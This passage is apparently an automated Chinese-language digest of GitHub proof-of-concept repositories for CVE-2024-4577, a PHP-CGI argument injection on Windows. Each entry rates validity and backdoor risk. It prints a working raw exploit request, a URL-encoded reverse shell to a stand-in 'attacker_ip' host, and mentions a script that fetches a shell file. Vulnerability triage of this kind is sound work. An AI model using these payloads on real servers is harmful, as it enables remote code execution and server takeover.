## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时会受到影响。漏洞源于 Windows 在某些代码页配置下，“Best Fit” 策略可能导致命令行参数中的字符被错误转换，PHP-CGI 模块会将这些字符误解为 PHP 选项，从而允许攻击者向 PHP 传递恶意参数。 

**有效性：**
提供的 POC 代码通过 POST 请求向服务器发送包含恶意 PHP 代码的请求体，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行请求体中的 PHP 代码。如果服务器返回“vulnerable”，则表示漏洞利用成功。从漏洞原理以及多个参考链接中漏洞利用的描述，可以判断该POC代码是有效的。

**投毒风险：**
提供的漏洞利用代码主要是用于验证漏洞是否存在，本身并没有发现明显的恶意代码或后门，但是从github仓库的拉取和环境配置过程中存在一定风险。投毒风险较低，估计为 5%。

**利用方式：**
1.  **环境准备：** 搭建存在漏洞的 PHP 环境，包括：
    *   Windows 系统
    *   PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
    *   Apache 服务器
    *   PHP 以 CGI 模式运行
    *   配置系统 Locale 为日语、简体中文或繁体中文，以启用 Best-Fit 字符转换。
2.  **发送恶意请求：**  构造包含恶意 PHP 代码的 POST 请求，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行恶意代码。例如，使用以下请求：
```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{HOST}}
User-Agent: curl/8.3.0
Accept: /*
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo \"vulnerable\"; ?>
```

3.  **远程代码执行：** 成功利用漏洞后，攻击者可以在服务器上执行任意 PHP 代码，从而控制服务器。

**参考链接：**
*   [https://nvd.nist.gov/vuln/detail/cve-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577)
*   [https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure)
*   [https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong](https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong)
*   [https://github.com/xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**项目地址:** [AlperenY-cs/CVE-2024-4577](https://github.com/AlperenY-cs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #2

**来源**: [CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md](../2024/CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** PHP running in CGI mode on Windows with a codepage using "Best Fit" strategy enabled. 需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统上以 CGI 模式运行时出现的一个参数注入漏洞。由于 Windows 系统使用了 "Best Fit" 策略的代码页，恶意用户可以通过构造特殊字符，使得 PHP CGI 模块错误地将这些字符解析为 PHP 选项。这允许攻击者向 PHP 解释器传递恶意参数，从而执行任意 PHP 代码或者泄露源代码。

**利用方式：**

1.  **攻击向量：** 通过 HTTP 请求的 URL query string 传递恶意参数。
2.  **漏洞原理：**  Windows 的 "Best Fit" 代码页转换功能可能会将某些字符转换为其他字符，导致 PHP CGI 错误解析命令行参数。
3.  **攻击步骤：**
    *   构造包含恶意 PHP 选项的 URL，例如 `-d allow_url_include=1 -d auto_prepend_file=php://input`，允许包含远程文件。
    *   发送包含 PHP 代码的 POST 请求。
    *   利用 `php://input` 或 `data://` 等 wrapper 执行恶意代码。

**POC 代码分析：**

POC 代码 (`CVE-2024-4577.py`) 主要功能如下：

*   **Base64 编码：** 提供 Base64 编码函数，用于绕过某些过滤。
*   **服务器监听：** 包含一个简单的 TCP 服务器，可能用于接收反弹 shell（但代码中没有明确实现反弹 shell 功能）。
*   **SSL 检查：** 检查目标 URL 是否支持 SSL/TLS。
*   **WAF 检测：** 尝试绕过 Web 应用防火墙 (WAF)。 通过修改lfi参数和重新组合绕过waf。
*   **语法检查：** 通过发送包含特定 Flag 的 PHP 代码，检查目标是否容易受到Payload的影响并判断哪种方式可行。
*   **RCE 执行：** 利用 `php://input` 或 `data://` wrapper 执行任意 PHP 代码。

**投毒风险分析：**

该 POC 代码存在一定的投毒风险，约为 10%。主要风险点在于代码中的一些函数，例如服务器监听函数，可能被用于植入后门或执行其他恶意操作。虽然代码中没有明显的恶意行为，但攻击者可以修改代码以实现持久化控制或窃取敏感信息。代码中包含尝试绕过waf的操作,虽然出发点是尝试漏洞利用, 但也可能隐藏其他利用。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已经得到广泛证实，并且存在实际的利用案例。POC 代码的有效性较高，可以成功利用该漏洞在目标系统上执行任意 PHP 代码。

**总结：**

CVE-2024-4577 是一个严重的安全漏洞，攻击者可以利用该漏洞在受影响的 Windows 服务器上执行任意代码。建议尽快升级 PHP 版本，或者采取其他缓解措施。

**项目地址:** [BTtea/CVE-2024-4577-RCE-PoC](https://github.com/BTtea/CVE-2024-4577-RCE-PoC)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #3

**来源**: [CVE-2024-4577-Chocapikk_CVE-2024-4577.md](../2024/CVE-2024-4577-Chocapikk_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP-CGI模式，开启了使用"Best Fit"策略的编码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 环境下，使用 Apache 和 PHP-CGI 模式时存在的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 会使用 "Best-Fit" 策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**

1.  攻击者需要向目标服务器发送特制的HTTP请求，该请求包含畸形的 URL，URL 中包含经过特定编码的 PHP 选项，例如 `-d` 参数，用于设置 PHP 配置指令。
2.  利用 Windows 的 "Best-Fit" 字符转换特性，构造出可被 PHP-CGI 解析的参数，例如，通过替换 `-` 为 `%AD`， `=` 为 `%3D`。
3.  利用 `auto_prepend_file=php://input` 允许执行 POST 请求中的 PHP 代码。
4.  将需要执行的 PHP 代码放在 POST 请求体中，例如 `<?php system('whoami'); ?>`。
5.  目标服务器的 PHP-CGI 进程将执行攻击者提供的 PHP 代码，从而实现远程代码执行。

**有效性：**

提供的 POC 代码 `exploit.py` 尝试自动化利用此漏洞。它包含以下关键步骤：

*   **路径探测:** 尝试不同的 PHP-CGI 路径（例如 `/php-cgi/php-cgi.exe`）。
*   **参数构造:** 通过替换特殊字符来构造 PHP 配置参数，例如 `-d`。
*   **代码注入:** 使用 `auto_prepend_file` 和 `php://input` 将 PHP 代码注入到目标服务器。
*   **命令执行:**  使用 `system()` 函数执行指定的命令。

因此，提供的 POC 代码在满足漏洞利用条件的环境下是有效的。

**投毒风险：**

`exploit.py` 主要功能是扫描和利用漏洞，但也存在一定的投毒风险：

*   **依赖项风险：** `requirements.txt` 中可能存在恶意依赖项，尽管可能性较低，但仍需要注意。可以通过检查 `requirements.txt` 中列出的依赖项及其来源来降低风险。
*   **代码逻辑风险：** 即使代码表面上是无害的，也可能存在隐藏的恶意逻辑。例如，作者可能会添加收集目标信息的代码，并将这些信息发送到外部服务器。

代码中存在base64编码和解码,存在一定的风险,需要人工检查。
总体来说，该代码的投毒风险评估为10%，主要集中在依赖项和隐藏逻辑方面。需要进行代码审计以确定是否存在恶意代码。


**项目地址:** [Chocapikk/CVE-2024-4577](https://github.com/Chocapikk/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #4

**来源**: [CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md](../2024/CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP运行在CGI模式下，开启了使用“Best Fit”策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的严重漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，则 Windows 可能会使用“Best-Fit”行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**漏洞利用分析：**

提供的 Python 脚本 `CVE-2024-4577.py` 旨在批量检测和利用此漏洞。

1.  **有效性：** 根据漏洞描述和漏洞利用代码，该PoC利用`auto_prepend_file`和`allow_url_include`选项来包含`php://input`，从而允许攻击者注入任意 PHP 代码。如果目标环境满足漏洞利用的先决条件（Windows，CGI模式，特定版本等），则该PoC应该是有效的。搜索结果也表明该漏洞已被积极利用。
2.  **投毒风险：**  代码总体来说比较简单，主要就是发送Payload，读取返回。但是作者有添加referer头的行为，如果作者有意投毒，可以在check_exploit方法中加入恶意代码，比如，如果探测目标存在漏洞，则发送漏洞域名，以及服务器相关信息到指定服务器。或者加入一些迷惑性代码，干扰分析人员分析。基于作者添加referer头的行为, 并且根据代码量判断，投毒风险较低，判断为10%。
3.  **利用方式：**
    *   攻击者通过构造包含恶意 PHP 代码的 HTTP 请求，并利用 Windows 代码页的“Best Fit”转换特性，将特殊字符转换为 PHP 选项。
    *   这些 PHP 选项会被 PHP CGI 模块错误解析，例如，`auto_prepend_file=php://input` 允许攻击者将 HTTP 请求体的内容作为 PHP 代码执行。
    *   攻击者可以通过这种方式在服务器上执行任意 PHP 代码，从而控制服务器。

**PoC代码分析：**

*   `clean_domain(domain)`: 清理域名，移除 `http://` 或 `https://` 前缀，并提取域名部分。
*   `check_exploit(domain)`:  对目标域名发送包含 PHP 代码的 HTTP POST 请求。Payload是 `<?php phpinfo(); ?>`。
    *   使用 `auto_prepend_file=php://input` 将 POST 请求的内容（payload）作为 PHP 代码执行。
    *   检查响应中是否包含 "PHP Version" 字符串，以判断漏洞是否成功利用。
    *   如果成功，将 URL 写入 `vulnerable.txt` 文件。
*   `start(file, threads)`: 从文件中读取域名列表，并使用多线程并发地执行 `check_exploit` 函数。
*   主程序：解析命令行参数，调用 `start` 函数开始漏洞检测。

**项目地址:** [CirqueiraDev/MassExploit-CVE-2024-4577](https://github.com/CirqueiraDev/MassExploit-CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #5

**来源**: [CVE-2024-4577-Dejavu666_CVE-2024-4577.md](../2024/CVE-2024-4577-Dejavu666_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，允许未经身份验证的攻击者在目标服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI mode, specific codepage settings)

**利用条件:** Windows系统，PHP运行于CGI模式，且系统配置了使用"Best Fit"策略的特定代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时，特定的代码页配置可能导致参数注入。Windows系统会使用“Best-Fit”策略替换命令行中的某些字符，这可能被PHP CGI模块错误地解释为PHP选项。攻击者可以通过发送特制的HTTP请求，将恶意PHP选项传递给PHP二进制文件，从而导致任意代码执行。提供的POC代码包含两个脚本：`cek.py` 用于执行命令，`cuk.py` 用于下载shell。`cek.py`通过构造包含`allow_url_include`和`auto_prepend_file`选项的请求，利用`php://input`流执行PHP代码。`cuk.py`脚本尝试从github下载一个ini.php文件到/tmp目录，存在一定的投毒风险。

**有效性评估：**
根据漏洞描述和已公开的利用信息，该漏洞利用的有效性较高，存在公开可用的POC代码，并且已经观察到在野利用。

**投毒风险评估：**
`cek.py`脚本直接执行用户指定的命令，不存在明显的投毒代码。`cuk.py`脚本从`https://github.com/Dejavu666/kng/raw/refs/heads/main/ini.php`下载文件到`/tmp/ini.php`，这意味着如果该URL指向的文件被恶意修改，攻击者可以控制目标服务器。这种行为引入了投毒风险，但需要攻击者能够控制该Github仓库中的文件。因此，投毒风险并非100%，考虑到其需要依赖于外部资源的可控性，风险评估为10%。

**利用方式：**
1.  攻击者发送包含恶意PHP选项的HTTP请求。
2.  Windows系统使用“Best-Fit”策略转换请求中的字符。
3.  PHP CGI模块错误地将转换后的字符解释为PHP选项。
4.  通过`allow_url_include`和`auto_prepend_file`选项包含并执行`php://input`流中的PHP代码，实现任意代码执行。
5. 可以使用`cek.py`执行系统命令，或者使用`cuk.py`下载恶意文件到服务器上执行。

**项目地址:** [Dejavu666/CVE-2024-4577](https://github.com/Dejavu666/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #6

**来源**: [CVE-2024-4577-Didarul342_CVE-2024-4577.md](../2024/CVE-2024-4577-Didarul342_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** PHP 8.1.x (< 8.1.29), 8.2.x (< 8.2.20), 8.3.x (< 8.3.8)，运行在Windows下的CGI模式

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统启用了某些代码页，允许“Best Fit”转换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响在Windows上运行的PHP。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，导致泄露源代码或执行任意PHP代码。 

**有效性:**

提供的PoC代码（CVE-2024-4577.py）尝试通过构造包含特殊字符的URL来利用此漏洞，将`allow_url_include`设置为1，并设置`auto_prepend_file`为`php://input`，然后通过POST请求发送包含要执行的PHP代码的数据。如果目标存在漏洞，这段PHP代码将被执行。

根据搜索引擎的结果和漏洞库信息，该漏洞已经存在在野利用，并且有公开可用的PoC，表明该PoC是有效的。

**投毒风险:**

查看提供的python脚本，脚本本身的功能是发送payload到目标地址，检测目标是否存在漏洞，检测的依据是返回内容中是否包含gotr00t字符串。脚本本身没有发现明显的恶意代码，但是考虑到以下情况，仍然存在一定投毒风险：

1.  **域名欺骗:**  `domains.txt` 如果被替换为包含恶意域名的文件，那么脚本会尝试连接这些恶意域名。但这不是脚本本身的投毒，而是依赖外部文件。
2.  **命令注入:**  虽然脚本本身没有直接执行系统命令，但是 `-c/--command`  参数允许用户指定要执行的PHP代码。如果用户不小心执行了恶意PHP代码，可能导致服务器受损。但这不是脚本作者的投毒，而是用户使用不当。
3.  **依赖包:**  `requirements.txt` 文件中列出了依赖包。如果这些依赖包被替换为恶意版本，可能会导致安全问题。但这通常属于供应链攻击，不是脚本作者直接投毒。

考虑到以上因素，认为脚本本身被作者投毒的可能性较低，大约在5%左右，主要风险在于使用者利用该脚本执行恶意命令或使用了被篡改的依赖包。

**利用方式:**

1.  攻击者需要找到一个运行在Windows服务器上，并且使用CGI模式的PHP应用，同时确认目标系统启用了具有“Best Fit”行为的代码页。
2.  构造包含特殊字符的恶意URL。这些特殊字符会被Windows的“Best Fit”转换机制转换为PHP选项。
3.  通过设置`allow_url_include`为1，并设置`auto_prepend_file`为`php://input`，将要执行的PHP代码通过POST请求发送到目标服务器。
4.  服务器执行恶意PHP代码，攻击者从而控制服务器。

**项目地址:** [Didarul342/CVE-2024-4577](https://github.com/Didarul342/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #7

**来源**: [CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md](../2024/CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，系统使用特定的代码页（Best-Fit），且使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI中的OS命令注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上运行任意PHP代码。

**有效性：**
从提供的漏洞库信息和搜索结果来看，该漏洞已被广泛利用，并且有公开的PoC代码。Akamai等机构已观察到实际利用案例。因此，认为该漏洞的PoC是有效的。

**投毒风险：**
提供的代码片段是漏洞信息的JSON格式，不包含任何可执行代码。因此，直接从这个JSON文件判断投毒风险是不可能的。需要分析具体的利用代码才能判断。考虑到Github上存在大量的POC, 假设攻击者在代码中添加了恶意代码，如反弹shell或下载执行恶意文件等，有一定的投毒可能性，估算投毒风险为10%。

**利用方式：**
利用方式主要包括以下步骤：
1.  **确定目标：** 找到运行在Windows上，且以CGI模式运行的PHP服务器，版本在受影响范围内 (PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8)。需要特别注意的是，apache服务器是必要条件之一
2.  **构造恶意请求：** 构造包含恶意PHP选项的HTTP请求。利用Windows的“Best-Fit”字符转换，将特殊字符转换为PHP选项，例如`-d`选项可以用来设置PHP配置项，`-r`选项可以直接执行PHP代码。
3.  **执行任意代码：** 通过`-d`或`-r`选项，执行任意PHP代码，例如执行`system()`函数来执行系统命令，或者写入webshell文件到服务器。

**示例：**
`?%AA-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input -r+%24sock%3dfsockopen(%22attacker_ip%22%2c1337)%3bwhile(%21feof(%24sock))%7b%24data.%3dfread(%24sock%2c1024)%3b%7d%24shell%3dshell_exec(%22/bin/sh+-i%22)%3bfwrite(%24sock%2c%24shell)%3b`

此示例中， `%AA` 被转换为 `-` ，然后使用`-d` 和 `-r`执行任意代码，建立反弹shell连接到攻击者的IP地址和端口。

**项目地址:** [Entropt/CVE-2024-4577_Analysis](https://github.com/Entropt/CVE-2024-4577_Analysis)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #8

**来源**: [CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md](../2024/CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows)

**利用条件:** Windows服务器, PHP以CGI模式运行，且系统使用某些启用了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的参数注入漏洞。当系统启用了某些使用“Best Fit”策略的代码页时，Windows 可能会使用该策略替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**
攻击者通过构造特殊的 URL，包含经过 "Best Fit" 转换后会被 PHP 解释器解析为选项的字符，从而注入恶意参数。PoC 代码利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并直接将包含恶意代码的请求体作为 PHP 代码执行，实现远程代码执行。

**有效性：**
根据漏洞信息，搜索结果和提供的漏洞利用代码，该POC代码有效。已经有实际的攻击案例发生。

**投毒风险：**
查看PoC代码，主要功能是发送包含特定参数的POST请求，以利用漏洞实现RCE。初步分析PoC代码没有明显的恶意行为，但是由于代码可以执行任意命令,存在一定风险. 投毒风险评估为5%。
  * 依赖的requests模块本身可能有潜在风险
  * 虽然代码中没有直接的恶意逻辑，但攻击者可能会修改PoC，添加反弹shell、下载恶意文件等功能。

**项目地址:** [Gill-Singh-A/CVE-2024-4577-Exploit](https://github.com/Gill-Singh-A/CVE-2024-4577-Exploit)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #9

**来源**: [CVE-2024-4577-Ianthinus_CVE-2024-4577.md](../2024/CVE-2024-4577-Ianthinus_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统 + Apache + PHP-CGI + 存在Best-Fit策略的codepage

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当以 CGI 模式运行时，并且系统启用了使用 "Best Fit" 策略的代码页时，可能受到攻击。

**利用方式：**
攻击者可以利用 Windows 的 "Best-Fit" 字符转换行为，将恶意参数注入到 PHP CGI 进程的命令行参数中。PHP CGI 模块会将这些被转换后的字符解释为 PHP 选项，从而允许攻击者执行以下操作：

1.  **源代码泄露：** 通过注入参数来泄露 PHP 脚本的源代码。
2.  **远程代码执行：** 通过注入参数来执行任意 PHP 代码。

**POC 代码分析：**
提供的 POC 代码包含以下文件：

*   `Readme`：包含使用 PowerShell 进行漏洞利用的示例。通过 POST 请求，将包含恶意 PHP 代码的 payload 发送到目标服务器，并利用 `%AD` 字符绕过某些安全限制，设置 `allow_url_include` 和 `auto_prepend_file` 选项，从而执行远程代码。
*   `check.php`：用于检测目标环境是否满足漏洞利用的条件，包括 PHP 版本、SAPI 模式、操作系统和系统区域设置。
*   `httpd-xampp.conf`：XAMPP 的 Apache 配置文件，用于配置 PHP 环境。

**有效性：**
提供的 POC 代码是有效的，可以用于在满足漏洞利用条件的环境中执行任意 PHP 代码。搜索引擎结果也表明该漏洞已经被广泛利用。

**投毒风险：**
该仓库主要用于演示和验证 CVE-2024-4577 漏洞。 虽然主要代码看起来是无害的，但考虑到以下因素，存在一定的投毒风险：

*   POC本身就是一段恶意的代码，能执行远程命令。
*   `Readme` 文件中的 PowerShell 命令直接执行 POST 请求，存在注入恶意代码的可能性。 虽然例子是`whoami`但是如果被替换成别的, 则会造成投毒。

考虑到POC的特殊性，这里将投毒风险评估为10%。主要原因是，大部分代码是用于漏洞检测和利用，恶意代码的存在是为了利用漏洞，而不是为了隐藏恶意功能。

**项目地址:** [Ianthinus/CVE-2024-4577](https://github.com/Ianthinus/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #10

**来源**: [CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md](../2024/CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行和敏感信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，并启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 平台上的 PHP CGI 模式。当系统配置为使用某些代码页时，Windows 可能会使用“Best-Fit”策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞信息和搜索结果，此漏洞的利用是有效的。多个来源表明该漏洞已在野外被利用，并且存在公开可用的 PoC 代码。

**投毒风险：**
提供的代码库是一个扫描器，用于检测系统是否容易受到 CVE-2024-4577 攻击。它没有包含漏洞利用代码，因此，直接利用此代码库进行攻击是不可能的。主要代码是检测是否存在漏洞，而非利用漏洞。代码库虽然引入了requests,colorama,pyfiglet等库,但在合理的范围内,没有发现明显的恶意代码或后门,但是考虑到任何依赖引入都存在一定的风险，因此投毒风险评估为10%。

**利用方式：**
该漏洞利用方式如下：
1.  **目标环境：** 目标服务器必须运行在 Windows 操作系统上，并且 PHP 运行在 CGI 模式下。
2.  **代码页配置：** 系统需要配置为使用某种代码页，该代码页使用 "Best Fit" 策略进行字符转换。
3.  **参数注入：** 攻击者通过构造包含特定字符的 URL 或 POST 请求，利用 Windows 的 "Best Fit" 转换特性，将恶意参数注入到 PHP 的命令行中。
4.  **远程代码执行：** 注入的恶意参数被 PHP CGI 模块解析，从而允许攻击者执行任意 PHP 代码或操作系统命令。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数来直接执行 PHP 代码。

攻击者可以利用此漏洞读取服务器上的敏感文件，修改网站内容，甚至完全控制服务器。

**项目地址:** [InfoSec-DB/PHPCGIScanner](https://github.com/InfoSec-DB/PHPCGIScanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #11

**来源**: [CVE-2024-4577-Jcccccx_CVE-2024-4577.md](../2024/CVE-2024-4577-Jcccccx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，可能导致完全控制受影响的Windows服务器

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8

**利用条件:** Windows服务器，Apache，PHP-CGI模式，系统使用特定的代码页并启用了"Best Fit"策略

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞允许未经身份验证的攻击者在易受攻击的Windows PHP服务器上执行任意代码。该漏洞源于PHP-CGI在Windows环境下的参数处理缺陷，当系统配置为使用具有“Best-Fit”行为的代码页时，传递给Win32 API函数的命令行参数中的某些字符可能会被错误地解释为PHP选项。攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意选项，从而导致远程代码执行。

**利用方式：**

1.  **目标确认：** 确认目标服务器运行在Windows系统上，并且使用Apache和PHP-CGI模式。
2.  **代码页检测：** 确认目标系统的代码页配置允许"Best Fit"转换。
3.  **构造恶意URI：** 构造包含恶意PHP选项的URI，例如，使用`cgi.force_redirect=0`绕过重定向限制，使用`allow_url_include=1`允许包含远程文件，使用`auto_prepend_file=php://input`将POST数据作为PHP代码执行。
4.  **发送POST请求：**  发送POST请求到构造的URI，并将包含恶意代码的PHP代码作为请求体发送。
5.  **命令执行：** 服务器执行恶意PHP代码，攻击者可以执行任意系统命令。

**POC 分析：**

提供的POC代码 `CVE_2024_4577_test.py` 主要用于检测漏洞是否存在，它通过构造特定的URI和PHP代码，发送POST请求到目标服务器，并检查响应中是否包含预期的输出，以验证漏洞是否可利用。 `CVE_2024_4577_exp.py` 是用于执行命令的EXP。

**投毒风险分析：**

仔细检查了提供的POC代码，未发现任何明显的投毒迹象。代码逻辑清晰，主要功能是发送精心构造的HTTP请求，并检查响应以确认漏洞的存在。使用的PHP代码也是为了执行预定的测试命令，没有发现任何试图在目标系统上安装后门或执行恶意操作的代码。

**搜索引擎结果：**

搜索结果表明CVE-2024-4577是一个严重的、广泛利用的漏洞。多个安全厂商和研究人员都发布了相关的分析和警告。该漏洞已被添加到CISA的已知被利用漏洞目录（KEV），表明该漏洞在野外被积极利用。


**项目地址:** [Jcccccx/CVE-2024-4577](https://github.com/Jcccccx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #12

